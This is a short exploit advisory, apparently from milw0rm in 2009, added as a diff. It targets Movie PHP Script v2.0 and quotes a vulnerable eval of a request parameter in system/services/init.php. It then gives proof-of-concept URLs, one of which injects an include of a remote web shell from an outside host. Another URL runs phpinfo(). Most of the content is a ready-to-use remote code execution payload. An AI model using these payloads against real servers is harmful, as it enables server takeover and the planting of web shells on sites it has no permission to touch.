@@ -1,0 +1,29 @@
+#################################################################################################################
+[+] Movie PHP Script v2.0 Remote PHP Code Execution
+[+] Discovered By SirGod 
+[+] www.mortal-team.org
+#################################################################################################################
+
+[+] Remote PHP Code Execution
+
+  - Vulnerable code in  system/services/init.php :
+
+---------------------------------------------------------------------------------
+Line 84 : @eval(stripslashes($_REQUEST['anticode']));
+---------------------------------------------------------------------------------
+
+- PoC : 
+
+    http://127.0.0.1/[path/]system/services/init.php?anticode=[YOUR PHP CODE]
+
+- Example : 
+
+   http://127.0.0.1/path/system/services/init.php?anticode=include "http://www.darkmindz.com/shell/x2300_mod.txt";
+
+- Example 2 :
+
+  http://127.0.0.1/path/system/services/init.php?anticode=phpinfo();
+
+#################################################################################################################
+
+# milw0rm.com [2009-06-03]
